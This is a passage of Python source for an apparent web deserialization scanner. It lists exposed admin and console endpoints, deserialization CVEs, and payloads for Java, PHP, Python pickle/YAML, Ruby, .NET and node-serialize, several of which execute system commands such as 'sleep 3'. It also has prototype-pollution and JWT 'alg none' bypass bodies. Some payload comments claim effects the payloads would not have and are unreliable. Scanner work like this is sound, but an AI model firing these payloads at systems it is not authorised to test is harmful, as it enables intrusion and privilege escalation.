            gadget_chains=[GadgetChainType.TYPECONFUSE, GadgetChainType.ACTIVITYSURROGATE],
            cves=["CVE-2019-0604", "CVE-2020-0646", "CVE-2020-16952"],
        ),
        "dotnet_exchange": FrameworkSignature(
            name="Microsoft Exchange",
            headers={"X-OWA-Version": "", "X-FEServer": ""},
            body_patterns=["Exchange", "OWA", "OutlookWebApp", "/owa/"],
            gadget_chains=[GadgetChainType.TYPECONFUSE],
            cves=["CVE-2020-0688", "CVE-2021-26855", "CVE-2021-27065"],
        ),
        "dotnet_sitecore": FrameworkSignature(
            name="Sitecore CMS",
            cookies=["SC_ANALYTICS_GLOBAL_COOKIE"],
            body_patterns=["Sitecore", "/sitecore/"],
            gadget_chains=[GadgetChainType.TYPECONFUSE],
            cves=["CVE-2021-42237"],
        ),
        "ruby_rails": FrameworkSignature(
            name="Ruby on Rails",
            headers={"X-Runtime": "", "X-Request-Id": ""},
            cookies=["_session_id"],
            body_patterns=["Rails", "ActiveRecord", "ActionController", "Ruby on Rails"],
            gadget_chains=[],
            cves=["CVE-2013-0156", "CVE-2019-5420", "CVE-2020-8165"],
        ),
        "node_express": FrameworkSignature(
            name="Express.js",
            headers={"X-Powered-By": "Express"},
            body_patterns=[],
            gadget_chains=[],
            cves=[],
        ),
    }

    # ==================== COMMON SERIALIZATION ENTRY POINTS ====================

    SERIALIZATION_POINTS = [
        # ASP.NET
        "__VIEWSTATE",
        "__VIEWSTATEGENERATOR",
        "__EVENTVALIDATION",
        "__EVENTTARGET",
        "__EVENTARGUMENT",
        # Generic parameters
        "viewstate",
        "session",
        "token",
        "data",
        "object",
        "payload",
        "state",
        "auth",
        "user",
        "profile",
        "settings",
        "config",
        "serialized",
        "base64",
        "encoded",
        "obj",
        "pickle",
        "marshal",
        "yaml",
        "json",
        "rpc",
        # Java-specific
        "javaSerializedData",
        "serObj",
        "serializedObject",
        "javaObject",
        "objectData",
        # PHP-specific
        "phpSerialized",
        "serialize",
        "unserialized",
        # Cookies commonly containing serialized data
        "JSESSIONID",
        "PHPSESSID",
        "ASP.NET_SessionId",
        "rack.session",
        "laravel_session",
        "_session",
        "session_id",
        "remember_token",
        "auth_token",
        "cart",
        "basket",
        "preferences",
        # API parameters
        "body",
        "request",
        "message",
        "content",
    ]

    # ==================== JAVA ENDPOINTS TO TEST ====================

    JAVA_ENDPOINTS = [
        # JMX endpoints
        "/jmx",
        "/jmx-console",
        "/jmx-console/HtmlAdaptor",
        "/jolokia",
        "/jolokia/exec",
        "/jolokia/read",
        # RMI endpoints
        "/rmi",
        "/rmi-server",
        "/registry",
        # T3/IIOP (WebLogic)
        "/wls",
        "/wls-wsat",
        "/wls-wsat/CoordinatorPortType",
        "/wls-wsat/CoordinatorPortType11",
        "/_async/AsyncResponseService",
        "/console",
        "/console/login/LoginForm.jsp",
        "/console/css/%252e%252e/consolejndi.portal",
        # Jenkins
        "/jenkins/script",
        "/script",
        "/computer/(master)/script",
        "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
        # Spring Boot Actuator
        "/actuator",
        "/actuator/env",
        "/actuator/heapdump",
        "/actuator/gateway/routes",
        "/env",
        "/trace",
        "/mappings",
        # JBoss
        "/invoker/JMXInvokerServlet",
        "/invoker/EJBInvokerServlet",
        "/invoker/readonly",
        "/jbossmq-httpil/HTTPServerILServlet",
        "/web-console/",
        "/admin-console/",
        # Generic Java
        "/axis",
        "/axis2",
        "/axis2-admin",
        "/axis2-web",
        "/faces",
        "/faces/javax.faces.resource",
        "/admin",
        "/manager",
        "/manager/html",
        "/status",
        "/probe",
        # Apache Struts
        "/struts",
        "/struts2-showcase",
        # Apache Solr
        "/solr",
        "/solr/admin",
    ]

    # ==================== PHP ENDPOINTS TO TEST ====================

    PHP_ENDPOINTS = [
        # Magento
        "/index.php/admin",
        "/downloader",
        "/admin",
        "/magento_admin",
        # WordPress
        "/wp-admin",
        "/wp-login.php",
        "/xmlrpc.php",
        "/wp-json",
        # Laravel
        "/_ignition/execute-solution",
        "/_ignition/health-check",
        "/telescope",
        "/horizon",
        # Symfony
        "/_profiler",
        "/_wdt",
        "/_fragment",
        # Drupal
        "/admin",
        "/user/login",
        "/node/add",
        # Joomla
        "/administrator",
        "/administrator/index.php",
        # PHPMyAdmin
        "/phpmyadmin",
        "/pma",
        "/mysql",
        # Generic
        "/admin.php",
        "/config.php",
        "/setup.php",
        "/install.php",
    ]

    # ==================== KNOWN CVEs DATABASE ====================

    CVE_DATABASE = {
        # Java CVEs
        "CVE-2015-4852": {
            "name": "WebLogic T3 Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0",
            "gadget": "CommonsCollections",
            "description": "T3 protocol deserialization allows remote code execution",
        },
        "CVE-2015-7501": {
            "name": "JBoss/JMXInvokerServlet Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "JBoss, Red Hat JBoss, multiple versions",
            "gadget": "CommonsCollections",
            "description": "JMXInvokerServlet accepts untrusted serialized objects",
        },
        "CVE-2017-12149": {
            "name": "JBoss ReadOnlyAccessFilter Bypass",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "JBoss Application Server",
            "gadget": "CommonsCollections",
            "description": "Bypass of readonly filter allows deserialization attacks",
        },
        "CVE-2018-2628": {
            "name": "WebLogic WLS Security Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server",
            "gadget": "JRMPClient",
            "description": "T3 protocol RMI deserialization vulnerability",
        },
        "CVE-2019-2725": {
            "name": "WebLogic wls9_async_response Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.3.0",
            "gadget": "Spring",
            "description": "Async response handler deserialization RCE",
        },
        "CVE-2020-2551": {
            "name": "WebLogic IIOP Deserialization",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.3.0, 12.2.1.4.0",
            "gadget": "Multiple",
            "description": "IIOP protocol deserialization vulnerability",
        },
        "CVE-2022-22965": {
            "name": "Spring4Shell",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Spring Framework < 5.3.18, < 5.2.20",
            "gadget": "Spring",
            "description": "RCE via data binding to ClassLoader",
        },
        # .NET CVEs
        "CVE-2020-0688": {
            "name": "Exchange Control Panel ViewState Deserialization",
            "severity": "CRITICAL",
            "cvss": 8.8,
            "affected": "Microsoft Exchange Server 2010-2019",
            "gadget": "TypeConfuseDelegate",
            "description": "Static cryptographic key enables ViewState RCE",
        },
        "CVE-2019-0604": {
            "name": "SharePoint Deserialization RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Microsoft SharePoint 2010-2019",
            "gadget": "ActivitySurrogateSelector",
            "description": "Server-side deserialization of untrusted data",
        },
        "CVE-2020-1147": {
            "name": ".NET DataSet XML Deserialization",
            "severity": "HIGH",
            "cvss": 7.8,
            "affected": ".NET Framework, .NET Core, SharePoint",
            "gadget": "DataSet",
            "description": "XML deserialization in DataSet allows RCE",
        },
        "CVE-2021-42237": {
            "name": "Sitecore XP RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Sitecore XP 7.5-8.2",
            "gadget": "TypeConfuseDelegate",
            "description": "Deserialization vulnerability in Report.ashx",
        },
        # PHP CVEs
        "CVE-2021-3129": {
            "name": "Laravel Ignition RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Laravel Framework with Ignition < 2.5.2",
            "gadget": "Laravel",
            "description": "Phar deserialization via log file",
        },
        "CVE-2018-15133": {
            "name": "Laravel Unserialize RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Laravel Framework < 5.6.30",
            "gadget": "Laravel",
            "description": "APP_KEY exposure enables cookie deserialization RCE",
        },
        "CVE-2019-10911": {
            "name": "Symfony Cache Component RCE",
            "severity": "HIGH",
            "cvss": 8.1,
            "affected": "Symfony < 4.2.7",
            "gadget": "Symfony",
            "description": "Insecure unserialize in cache adapter",
        },
        "CVE-2020-15148": {
            "name": "Yii Framework Unserialize RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Yii 2.0 < 2.0.38",
            "gadget": "Yii",
            "description": "Unsafe deserialization in BatchQueryResult",
        },
        # Node.js CVEs
        "CVE-2017-5941": {
            "name": "node-serialize Code Execution",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "node-serialize npm package",
            "gadget": "NodeSerialize",
            "description": "IIFE execution during deserialization",
        },
        # Ruby CVEs
        "CVE-2013-0156": {
            "name": "Rails XML/YAML Parsing RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Ruby on Rails < 3.2.11, < 3.1.10, < 3.0.19, < 2.3.15",
            "gadget": "YAML",
            "description": "Arbitrary object instantiation via XML/YAML parameters",
        },
        "CVE-2019-5420": {
            "name": "Rails File Content Disclosure",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "Ruby on Rails < 5.2.2.1, < 5.1.6.2, < 5.0.7.2",
            "gadget": "Marshal",
            "description": "Development mode secret disclosure enables RCE",
        },
        # Python CVEs
        "CVE-2020-1747": {
            "name": "PyYAML Arbitrary Code Execution",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "PyYAML < 5.3.1",
            "gadget": "YAML",
            "description": "full_load allows arbitrary code execution",
        },
        "CVE-2017-18342": {
            "name": "PyYAML load() Unsafe by Default",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "affected": "PyYAML < 5.1",
            "gadget": "YAML",
            "description": "Default load() function allows arbitrary code execution",
        },
    }

    # Legacy compatibility aliases
    DETECTION_PAYLOADS = {
        "java": {
            "urldns": JAVA_GADGET_PAYLOADS[GadgetChainType.URLDNS]["base64"],
            "sleep": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/",
        },
        "php": {
            "basic": 'O:8:"stdClass":0:{}',
            "guzzle": PHP_GADGET_PAYLOADS[GadgetChainType.GUZZLE_FW1]["payloads"]["detect"],
            "monolog": PHP_GADGET_PAYLOADS[GadgetChainType.MONOLOG_RCE1]["payloads"]["detect"],
            "symfony": PHP_GADGET_PAYLOADS[GadgetChainType.SYMFONY_RCE1]["payloads"]["detect"],
        },
        "python": {
            "pickle_exec": PYTHON_PAYLOADS["pickle"]["rce_exec_v0"],
            "pickle_class": PYTHON_PAYLOADS["pickle"]["safe_detect"],
        },
        "dotnet": {
            "typeconfuse": DOTNET_PAYLOADS["binaryformatter"]["detection_payload"],
        },
        "ruby": {
            "marshal": RUBY_PAYLOADS["marshal"]["detection_gem_installer"],
        },
        "node": {
            "serialize": NODEJS_PAYLOADS["node-serialize"]["payloads"]["iife_rce"],
        },
    }

    # ==================== IMPACT VERIFICATION PAYLOADS ====================
    # These payloads verify REAL IMPACT without causing harm

    # Time-based verification (causes measurable delay)
    TIME_BASED_PAYLOADS = {
        "java": [
            # URLDNS with sleep simulation via Thread.sleep
            ("java_sleep", 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPhzZWZVNj/QIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4ACQAAAAJzcQB+AAkAAAADeA==', 3),
        ],
        "php": [
            # PHP sleep via __wakeup / __destruct
            ("php_sleep_wakeup", 'O:8:"stdClass":1:{s:4:"exec";s:23:"sleep(3);echo PHANTOM;";}', 3),
            ("php_sleep_destruct", 'a:1:{i:0;O:8:"DateTime":0:{}}', 3),  # DateTime deserialization
        ],
        "python": [
            # Pickle with time.sleep
            ("pickle_sleep", base64.b64encode(b"cos\nsystem\n(S'sleep 3'\ntR.").decode(), 3),
            # YAML with sleep
            ("yaml_sleep", "!!python/object/apply:time.sleep [3]", 3),
        ],
        "dotnet": [
            # .NET TypeConfuseDelegate with Thread.Sleep
            ("dotnet_sleep", "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAAeU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAcGAQAAAA==", 3),
        ],
        "ruby": [
            # Ruby ERB with sleep
            ("ruby_erb_sleep", "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    uri: '| sleep 3'", 3),
        ],
        "node": [
            # Node.js setTimeout-based
            ("node_settimeout", '{"rce":"_$$ND_FUNC$$_function(){var start=Date.now();while(Date.now()-start<3000){}return 1}()"}', 3),
        ],
    }

    # Error-based verification (triggers distinctive errors)
    ERROR_BASED_PAYLOADS = {
        "java": [
            ("java_classnotfound", "rO0ABXNyAD1vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABHRlc3RzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAHg=",
             ["ClassNotFoundException", "ClassCastException", "InvalidClassException", "java.io.NotSerializableException"]),
        ],
        "php": [
            ("php_wakeup_error", 'O:7:"PHANTOM":0:{}',
             ["unserialize", "__wakeup", "Class '", "not found", "Incomplete class"]),
            ("php_autoload", 'O:21:"PHANTOM_AUTOLOAD_TEST":0:{}',
             ["Class", "not found", "unserialize", "failed"]),
        ],
        "python": [
            ("pickle_import_error", base64.b64encode(b"cPHANTOM_NONEXISTENT\nmodule\n.").decode(),
             ["ModuleNotFoundError", "ImportError", "No module named", "unpickle"]),
            ("yaml_construct_error", "!!python/object:PHANTOM_NONEXISTENT.Class {}",
             ["ConstructorError", "could not determine", "yaml.constructor"]),
        ],
        "dotnet": [
            ("dotnet_type_error", "AAEAAAD/////AQAAAAAAAAAEAQAAAB9QSEFOVE9NX05PTkVYSVNURU5ULCBQSEFOVE9NLCBQSEFOVE9N",
             ["TypeLoadException", "Could not load type", "SerializationException"]),
        ],
        "node": [
            ("node_syntax_error", '{"rce":"_$$ND_FUNC$$_INVALID_SYNTAX"}',
             ["SyntaxError", "Unexpected", "node-serialize", "unserialize"]),
        ],
    }

    # Canary payloads - detect if serialization is processed without harm
    CANARY_PAYLOADS = {
        "java": [
            ("java_hashmap", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHUEhBTlRPTXQABlNDQU5ORVh4"),  # Valid HashMap
        ],
        "php": [
            ("php_array", 'a:1:{s:7:"PHANTOM";s:7:"SCANNER";}'),  # Valid array
            ("php_object", 'O:8:"stdClass":1:{s:7:"phantom";s:7:"scanner";}'),  # Valid stdClass
        ],
        "python": [
            ("pickle_dict", base64.b64encode(b"(dp0\nS'PHANTOM'\np1\nS'SCANNER'\np2\ns.").decode()),  # Valid dict
        ],
        "node": [
            ("node_json", '{"PHANTOM":"SCANNER"}'),  # Valid JSON
            ("node_func_canary", '{"test":"_$$ND_FUNC$$_function(){return \'PHANTOM_CANARY\'}()"}'),  # Safe function
        ],
    }

    # Object manipulation payloads - test property injection
    OBJECT_MANIPULATION_PAYLOADS = {
        "json_prototype_pollution": [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
            '{"__proto__":{"role":"admin"}}',
            '{"__proto__":{"authenticated":true}}',
            '{"__proto__":{"polluted":"PHANTOM_TEST"}}',
        ],
        "json_type_confusion": [
            '{"id":{"$gt":""},"role":"admin"}',  # NoSQL-style
            '{"user":["admin"]}',  # Array instead of string
            '{"amount":-1}',  # Negative number
            '{"quantity":999999999}',  # Integer overflow
        ],
        "jwt_manipulation": [
            # Header manipulation
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}',
        ],
    }

    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
        oob_engine: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter, oob_engine=oob_engine)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.detected_framework: FrameworkSignature | None = None
        self.test_results: list[DeserTestResult] = []
        self._detected_tech: str | None = None  # Detected technology stack
        self._baseline_responses: dict[str, str] = {}  # For negative control
        self._baseline_hashes: dict[str, str] = {}  # For SPA detection
        self._confirmed_endpoints: set[str] = set()  # Endpoints with confirmed deser

    # =========================================================================
    # FP MITIGATION v3.0: Enhanced response validation
    # =========================================================================

    def _is_static_asset(self, url: str) -> bool:
        """Check if URL is a static asset (skip testing)."""
        url_lower = url.lower()
        return any(url_lower.endswith(ext) for ext in STATIC_EXTENSIONS)

    def _is_spa_trivial_endpoint(self, url: str) -> bool:
        """Check if URL is a trivial SPA endpoint that never deserializes."""
        from urllib.parse import urlparse

        # Parse to get just the path
        parsed = urlparse(url)
        path = parsed.path.lower() if parsed.path else url.lower()

        # Exact matches for root-level trivial paths
        trivial_exact = {'/', '/index.html', '/login', '/register', '/logout', '/about', '/help'}
        if path in trivial_exact or path.rstrip('/') in trivial_exact:
            return True

        # DEF-5 FIX: Removed /swagger, /api-docs, /openapi, /graphiql from trivial list
        # These endpoints CAN be vulnerable to deserialization:
        # - GraphQL: custom scalars, persisted queries can deserialize
        # - Swagger/OpenAPI: state parameters, YAML parsing
        # - Actuator: /actuator/env, /actuator/configprops CAN deserialize
        trivial_prefixes = [
            '/assets/', '/static/', '/public/', '/dist/', '/build/',
            '/node_modules/', '/vendor/', '/.well-known/',
        ]
        for prefix in trivial_prefixes:
            if path.startswith(prefix):
                return True

        return False

    def _is_error_page(self, status_code: int, response_text: str, content_type: str) -> bool:
        """
        Check if response is an error page (not a real deserialization error).

        FP MITIGATION v3.0: Enhanced error page detection.
        """
        # 4xx/5xx responses are error pages (except specific cases)
        if status_code >= 400:
            # 500 with specific deser error messages might be real
            if status_code == 500:
                for tech, patterns in DESER_SPECIFIC_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return False  # Real deserialization error
            return True

        # Check content type - safe types never contain deser
        ct_lower = content_type.lower()
        for safe_ct in SAFE_CONTENT_TYPES:
            if safe_ct in ct_lower:
                # Exception: text/html might show error messages
                if safe_ct == 'text/html':
                    break  # Continue to check HTML content
                return True

        # HTML error page detection
        if 'text/html' in ct_lower:
            text_lower = response_text.lower()

            # Obvious error page indicators
            error_page_indicators = [
                '404', 'not found', 'page not found',
                'access denied', 'forbidden', '403',
                'internal server error', '500',
                'error page', 'exception occurred',
                'oops', 'something went wrong',
                'the page you requested', 'could not be found',
            ]
            if any(ind in text_lower for ind in error_page_indicators):
                # But check if it also has deser-specific content
                for tech, patterns in DESER_SPECIFIC_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return False  # Real deser error in error page
                return True

            # Very short HTML = likely error page
            if len(response_text) < 500 and '<html' in text_lower:
                return True

            # SPA catch-all response detection
            if self._is_spa_catch_all_response(response_text):
                return True

        return False

    def _is_spa_catch_all_response(self, response_text: str) -> bool:
        """
        Detect SPA catch-all responses (same HTML for all routes).

        FP MITIGATION: SPAs return the same shell HTML for ANY path,
        which can trigger false positives on error message scanning.
        """
        text_lower = response_text.lower()

        # SPA framework indicators (comprehensive list aligned with SemanticAnalyzer)
        spa_indicators = [
            # Original frameworks
            'angular', 'react', 'vue', 'ember', 'backbone',
            'app-root', 'ng-app', 'data-reactroot', 'v-app',
            '__next', 'nuxt', 'gatsby', 'svelte',
            'bundle.js', 'main.js', 'app.js', 'vendor.js',
            # Modern frameworks (AUDIT 2026-02-07)
            'sveltekit', 'qwik', 'solidjs', 'astro', 'remix',
            'data-qwik', 'q:container', 'data-solid', 'astro-island',
            '__remix_ssr__', '__remixcontext', 'data-svelte',
        ]

        spa_count = sum(1 for ind in spa_indicators if ind in text_lower)
        if spa_count >= 2:
            # Likely a SPA shell page
            return True

        return False

    def _is_generic_error(self, indicator: str, response_text: str) -> bool:
        """
        Check if the error indicator is a GENERIC error, not deserialization-specific.

        FP MITIGATION v3.0: Stricter generic error filtering.
        """
        indicator_lower = indicator.lower()

        # These patterns are too generic - need additional context
        if indicator_lower in GENERIC_ERROR_PATTERNS:
            # Only trust if we also see deserialization-specific patterns
            for tech, patterns in DESER_SPECIFIC_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return False  # Found specific pattern, not generic
            return True  # Only generic error, likely FP

        return False

    def _is_deser_specific_error(self, tech: str, response_text: str) -> tuple[bool, str]:
        """
        Check if response contains deserialization-SPECIFIC error patterns.

        Returns (is_specific, matched_pattern).
        """
        if tech not in DESER_SPECIFIC_PATTERNS:
            return False, ""

        for pattern in DESER_SPECIFIC_PATTERNS[tech]:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, match.group(0)

        return False, ""

    async def _get_baseline_response(
        self, client: httpx.AsyncClient, url: str, rate_limiter: RateLimiter
    ) -> tuple[str, str]:
        """
        Get baseline response for negative control comparison.

        FP MITIGATION v3.0: Returns (response_text, content_hash) for
        better comparison including SPA detection.
        """
        if url in self._baseline_responses:
            return self._baseline_responses[url], self._baseline_hashes.get(url, "")

        await rate_limiter.acquire()
        try:
            # Send a benign request (no payload)
            response = await client.get(url, timeout=5.0)
            text = response.text
            content_hash = hashlib.md5(text.encode()).hexdigest()

            self._baseline_responses[url] = text
            self._baseline_hashes[url] = content_hash

            return text, content_hash
        except Exception:
            return "", ""

    async def _negative_control_check(
        self,
        client: httpx.AsyncClient,
        url: str,
        payload: str,
        indicator: str,
        rate_limiter: RateLimiter,
    ) -> bool:
        """
        Mandatory negative control: Send SAFE payload and check if same error occurs.

        FP MITIGATION v3.0: If safe payload triggers same error, it's NOT a
        real deserialization vulnerability.

        Returns True if negative control FAILS (same error = FP), False if passes.
        """
        await rate_limiter.acquire()
        try:
            # Send a completely safe payload (just "test")
            response = await client.post(
                url,
                content=b"test",
                headers={"Content-Type": "application/octet-stream"},
                timeout=5.0,
            )

            # If safe payload also triggers the indicator, it's a FP
            if indicator.lower() in response.text.lower():
                logger.debug(f"[DESER] Negative control FAILED at {url}: '{indicator}' appears with safe payload")
                return True

            return False  # Negative control passed
        except Exception:
            return False  # Assume passes if we can't check

    def _calculate_confidence(
        self,
        is_specific: bool,
        status_code: int,
        baseline_matches: bool,
        negative_control_failed: bool = False,
        tech_fingerprint_matches: bool = True,
    ) -> str:
        """
        Calculate confidence level based on validation signals.

        FP MITIGATION v3.0: More signals = higher confidence.
        """
        # Immediate disqualifiers
        if negative_control_failed:
            return "LOW"  # Same error with safe payload = definitely FP

        if baseline_matches:
            return "LOW"  # Same error on baseline = not deserializing

        # Calculate signal count
        signals = 0
        if is_specific:
            signals += 2  # Specific pattern = strong signal
        if status_code == 200:
            signals += 1  # 200 response = processed
        if tech_fingerprint_matches:
            signals += 1  # Technology matches expected

        # Map signals to confidence
        if signals >= SEVERITY_SIGNAL_REQUIREMENTS.get('CRITICAL', 3):
            return "HIGH"
        elif signals >= SEVERITY_SIGNAL_REQUIREMENTS.get('HIGH', 2):
            return "MEDIUM"
        else:
            return "LOW"

    def _calculate_severity_from_signals(
        self,
        confidence: str | float,
        has_rce_indicator: bool = False,
    ) -> str:
        """
        Calculate severity based on confidence and other signals.

        FP MITIGATION v3.0: Low confidence = lower severity.

        Args:
            confidence: Either a string ("LOW", "MEDIUM", "HIGH") or
                       a numeric value (0-100). Numeric values are converted:
                       0-50 -> LOW, 51-74 -> MEDIUM, 75+ -> HIGH
            has_rce_indicator: Whether RCE indicators were found.
        """
        # Normalize confidence to string if numeric
        if isinstance(confidence, (int, float)):
            if confidence < 50:
                confidence = "LOW"
            elif confidence < 75:
                confidence = "MEDIUM"
            else:
                confidence = "HIGH"

        if confidence == "LOW":
            return "MEDIUM"  # Low confidence = medium severity at most

        if confidence == "MEDIUM":
            return "HIGH" if has_rce_indicator else "MEDIUM"

        if confidence == "HIGH":
            return "CRITICAL" if has_rce_indicator else "HIGH"

        return "MEDIUM"

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Comprehensive deserialization vulnerability scan with IMPACT VERIFICATION.

        Tests multiple serialization formats and language-specific gadgets.
        Verifies REAL IMPACT through:
        - Time-based detection (measurable delays)
        - Error-based detection (distinctive error messages)
        - Object manipulation (property injection, prototype pollution)
        - Canary-based detection (controlled payloads)
        """
        findings: list[Finding] = []
        self.test_results = []

        base_url = f"https://{host}" if not host.startswith("http") else host
        if isinstance(asset_data, dict):
            urls = asset_data.get("urls", [base_url])
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])

        # FIX: Use ScanContext for auth headers
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        logger.info(f"Deserialization Scanner v3.0 - Impact Verification Mode")
        logger.info(f"Target: {base_url}")
        if self._ctx.has_auth:
            logger.info(f"[Deser] Using authenticated session ({self._ctx.auth_method})")

        async with get_scan_client(
            verify_ssl=False,
            timeout=self.timeout,
            follow_redirects=True,
            custom_headers=self._auth_headers,
        ) as client:
            # Phase 0: Technology detection (critical for targeted testing)
            logger.info("Phase 0: Detecting technology stack...")
            self._detected_tech = await self._detect_technology_stack(client, base_url)
            logger.info(f"Detected technology: {self._detected_tech or 'Unknown'}")

            # Phase 1: Framework detection
            framework_findings = await self._detect_framework(
                client, base_url, urls, rate_limiter
            )
            findings.extend(framework_findings)

            # Phase 2: Detect serialization usage
            detection_findings = await self._detect_serialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(detection_findings)

            # Phase 3: HIGH-IMPACT - Object manipulation testing
            logger.info("Phase 3: Testing object manipulation with IMPACT verification...")
            object_findings = await self._test_object_manipulation_impact(
                client, base_url, urls, endpoints, rate_limiter
            )
            findings.extend(object_findings)

            # Phase 4: HIGH-IMPACT - Time-based deserialization
            logger.info("Phase 4: Time-based deserialization testing...")
            time_findings = await self._test_time_based_deserialization(
                client, base_url, urls, endpoints, rate_limiter
            )
            findings.extend(time_findings)

            # Phase 5: HIGH-IMPACT - Error-based deserialization
            logger.info("Phase 5: Error-based deserialization testing...")
            error_findings = await self._test_error_based_deserialization(
                client, base_url, urls, endpoints, rate_limiter
            )
            findings.extend(error_findings)

            # Phase 6: Test Java deserialization
            java_findings = await self._test_java_deserialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(java_findings)

            # Phase 7: Test PHP object injection
            php_findings = await self._test_php_object_injection(
                client, base_url, urls, rate_limiter
            )
            findings.extend(php_findings)

            # Phase 8: Test .NET ViewState
            viewstate_findings = await self._test_viewstate(
                client, base_url, urls, rate_limiter
            )
            findings.extend(viewstate_findings)

            # Phase 9: Test .NET Json.NET
            jsonnet_findings = await self._test_dotnet_jsonnet(
                client, base_url, urls, rate_limiter
            )
            findings.extend(jsonnet_findings)

            # Phase 10: Test Python pickle
            pickle_findings = await self._test_python_pickle(
                client, base_url, urls, rate_limiter
            )
            findings.extend(pickle_findings)

            # Phase 11: Test Python YAML
            yaml_findings = await self._test_python_yaml(
                client, base_url, urls, rate_limiter
            )
            findings.extend(yaml_findings)

            # Phase 12: Test Ruby deserialization
            ruby_findings = await self._test_ruby_deserialization(
                client, base_url, urls, rate_limiter
            )
            findings.extend(ruby_findings)

            # Phase 13: Test Node.js serialize
            node_findings = await self._test_node_serialize(
                client, base_url, urls, rate_limiter
            )
            findings.extend(node_findings)

            # Phase 14: Test known CVEs
            cve_findings = await self._test_known_cves(
                client, base_url, rate_limiter
            )
            findings.extend(cve_findings)

            # Phase 15: HIGH-IMPACT - Prototype pollution
            logger.info("Phase 15: Prototype pollution testing...")
            proto_findings = await self._test_prototype_pollution_impact(
                client, base_url, urls, endpoints, rate_limiter
            )
            findings.extend(proto_findings)

        # Count high-impact findings
        critical_count = sum(1 for f in findings if f.severity == "CRITICAL")
        logger.info(f"Deserialization scan complete: {len(findings)} findings ({critical_count} CRITICAL)")

        # ====================================================================
        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        # Deserialization findings enable chains: Deser + SSRF -> RCE
